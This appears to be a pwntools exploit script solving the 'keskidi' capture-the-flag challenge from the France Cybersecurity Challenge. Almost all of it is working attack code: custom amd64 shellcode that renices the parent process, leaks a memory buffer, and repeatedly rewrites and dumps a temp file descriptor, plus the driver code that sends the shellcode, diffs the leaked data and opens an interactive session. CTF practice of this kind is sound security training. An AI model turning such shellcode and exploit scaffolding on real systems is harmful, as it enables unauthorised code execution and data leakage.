#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("keskidi_patched")


# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

rop = ROP(exe)

host, port = "challenges.france-cybersecurity-challenge.fr", "2103"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

shellc = asm('''
 push 110
  pop rax
  syscall
  cld
  push rax

  // renice parent
  xor edi,edi
  mov esi,eax
  mov edx,4
  mov eax,141
  syscall
  pop rax

  // output orig random
  mov r10,[rsp]
  add r10,(0x4060-0x13c0) 
  mov edi,1
  mov rsi,r10
  mov edx,0x1000
  mov eax,1
  syscall

  // sleep until parent start working
  mov eax,35
  mov rcx,500000000
  push rcx
  push 2
  mov rdi,rsp
  syscall

rewrite:
  // set offset to 0
  mov edi,[r10-0x20]
  xor esi,esi
  xor edx,edx
  mov eax,8
  syscall

  // rewrite temp file
  mov edi,[r10-0x20]
  mov rsi,r10
  mov edx,0x1000
  mov eax,1
  syscall

  mov rdi,[r10-0x20]
  mov eax,74
  syscall

rewrite2:
  // nanosleep wait parent works a bit
  mov eax,35
  mov rcx,100000000
  push rcx
  push 0
  mov rdi,rsp
  syscall

  // set offset to 0
  mov edi,[r10-0x20]
  xor esi,esi
  xor edx,edx
  push 8
  pop rax
  syscall

  // dump temp file again
  mov edi,[r10-0x20]
  lea rsi,[rsp-0x1100]
  mov edx,0x1000
  xor eax,eax
  syscall
  mov edx,eax
  push 1
  pop rax
  push 1
  pop rdi
  syscall

  jmp rewrite


''')

p.send(shellc)
buff = b''
size = 0x1000
while size>0:
  temp = p.recv(size)
  size -= len(temp)
  buff += temp

print('base random received')
#print(hexdump(buff))

for i in range(100):
#  print('-'*100)
  buff2 = b''
  size = 0x1000
  while size>0:
    temp = p.recv(size)
    size -= len(temp)
    buff2 += temp

  diff = b''
  for i in range(4096):
    if (buff[i:i+1] != buff2[i:i+1]):
      if buff[i:i+1] not in diff:
        diff += buff[i:i+1]

  print(diff)
  print('diff len='+str(len(diff)))    

p.interactive()

